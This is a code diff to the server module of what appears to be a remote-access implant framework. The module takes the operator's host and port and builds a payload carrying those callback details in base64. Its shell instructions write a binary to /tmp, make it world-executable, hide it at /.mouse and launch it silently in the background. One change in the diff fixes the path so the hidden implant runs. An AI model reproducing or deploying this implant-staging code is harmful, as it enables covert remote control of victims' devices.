@@ -49,21 +49,21 @@ class Server:
         try:
             lhost = h.getip()
             lport = None
-            choice = raw_input(h.info_general_raw("Set Local Host> "))
+            choice = raw_input(h.info_general_raw("Set Local Host: "))
             if choice != "":
                 lhost = choice
             h.info_general("LHOST ==> " + lhost)
             while True:
-                lport = raw_input(h.info_general_raw("Set Local Port> "))
+                lport = raw_input(h.info_general_raw("Set Local Port: "))
                 if not lport:
                     lport = 4444
                 try:
                     lport = int(lport)
                 except ValueError:
-                    h.info_error("Invalid port, please enter a valid integer")
+                    h.info_error("Invalid port, please enter a valid integer.")
                     continue
                 if lport < 1024:
-                    h.info_error("Invalid port, please enter a value >= 1024")
+                    h.info_error("Invalid port, please enter a value >= 1024.")
                     continue
                 break
             h.info_general("LPORT ==> " + str(lport))
@@ -99,10 +99,10 @@ class Server:
     def craft_payload(self,device_arch):
         # TODO: Detect uid before we send executable
         if not self.host:
-            h.info_error("Local Host is not set")
+            h.info_error("Local Host is not set!")
             return
         if not self.port:
-            h.info_error("Local Port is not set")
+            h.info_error("Local Port is not set!")
             return
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
@@ -125,7 +125,7 @@ class Server:
             "cat >/tmp/mouse;"+\
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
-            "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/.mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
